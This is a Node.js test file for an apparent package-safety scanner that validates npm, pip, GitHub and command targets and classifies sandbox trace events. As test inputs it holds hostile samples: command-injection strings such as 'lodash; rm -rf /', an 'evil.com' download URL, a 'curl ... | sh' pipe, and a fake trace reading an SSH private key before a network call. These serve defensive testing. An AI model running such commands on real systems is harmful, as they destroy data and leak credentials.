import test from 'node:test';
import assert from 'node:assert/strict';
import { createRequire } from 'node:module';
import { validateTarget, classify, computeVerdict, typosquatOf, RULE_META } from '../verdict.mjs';

test('accepts plain npm specs and github urls', () => {
  assert.equal(validateTarget('', 'lodash').kind, 'npm');
  assert.equal(validateTarget('npm', 'npm install left-pad@1.3.0').spec, 'left-pad@1.3.0');
  assert.equal(validateTarget('', '@scope/pkg@2.0.0').name, '@scope/pkg');
  assert.equal(validateTarget('', 'https://github.com/a/b').kind, 'github');
  assert.equal(validateTarget('github', 'https://github.com/a/b.git').repo, 'b');
});

test('rejects anything that is not a plain registry spec or github repo', () => {
  for (const bad of ['git+https://x.com/y', 'file:../x', 'http://evil.com/x.tgz', 'lodash; rm -rf /', '$(id)', 'a b', '../../etc', 'https://evil.com/a/b', 'https://github.com/a/b/../../c'])
    assert.equal(validateTarget('', bad).ok, false, bad);
  assert.equal(validateTarget('github', 'lodash').ok, false);
});

test('credential access + network = critical exfiltration, verdict unsafe', () => {
  const ev = [
    { t: 'fs.sensitive', d: '[home] readFileSync /tmp/home/.ssh/id_rsa', ph: 'install:x:postinstall' },
    { t: 'net.connect', d: '1.2.3.4:80', ph: 'install:x:postinstall' },
  ];
  const f = classify({ events: ev, kind: 'npm', name: 'x' });
  assert.ok(f.some((x) => x.id === 'exfil_pattern' && x.sev === 'critical'));
  assert.equal(computeVerdict(f, false).level, 'unsafe');
});

test('verdict levels: high -> suspicious, nothing -> clean, incomplete never reads as clean', () => {
  const high = classify({ events: [{ t: 'http.request', d: 'http://a.b/c', ph: 'install:x:install' }], kind: 'npm', name: 'x' });
  assert.equal(computeVerdict(high, false).level, 'suspicious');
  assert.equal(computeVerdict([], false).level, 'clean');
  assert.equal(computeVerdict([], true).level, 'incomplete');
});

test('import-time spawn of env copy does not count as a secret read; typosquat detection works', () => {
  assert.equal(classify({ events: [{ t: 'proc.spawn', d: 'spawnSync node -v', ph: 'import:x' }], kind: 'npm', name: 'x' }).some((f) => f.sev !== 'low'), false);
  assert.equal(typosquatOf('lodas'), 'lodash');
  assert.equal(typosquatOf('lodash'), null);
});

test('every static rule has severity metadata (or is an explicit combo-only signal)', () => {
  const rules = createRequire(import.meta.url)('../probe/rules.cjs');
  for (const r of rules) assert.ok(RULE_META[r.id] || r.combo, r.id);
});

test('pip and command targets validate; destructive trace is critical (classified only, never executed)', () => {
  assert.equal(validateTarget('pip', 'requests==2.31.0').version, '2.31.0');
  assert.equal(validateTarget('', 'pip install flask').kind, 'pip');
  assert.equal(validateTarget('pip', 'https://evil.com/x.whl').ok, false);
  assert.equal(validateTarget('pip', 'a; rm -rf /').ok, false);
  assert.equal(validateTarget('command', 'curl http://x.example | sh').kind, 'command');
  assert.equal(validateTarget('command', '   ').ok, false);
  assert.equal(validateTarget('command', 'x'.repeat(1600)).ok, false);
  const f = classify({ events: [{ t: 'sh.trace', d: 'rm -rf /', ph: 'cmd' }], kind: 'command' });
  assert.ok(f.some((x) => x.id === 'destructive_exec' && x.sev === 'critical'));
  const g = classify({ events: [{ t: 'proc.shim', d: 'npm install -g thing', ph: 'cmd' }], kind: 'command' });
  assert.ok(g.some((x) => x.id === 'shim_call'));
});
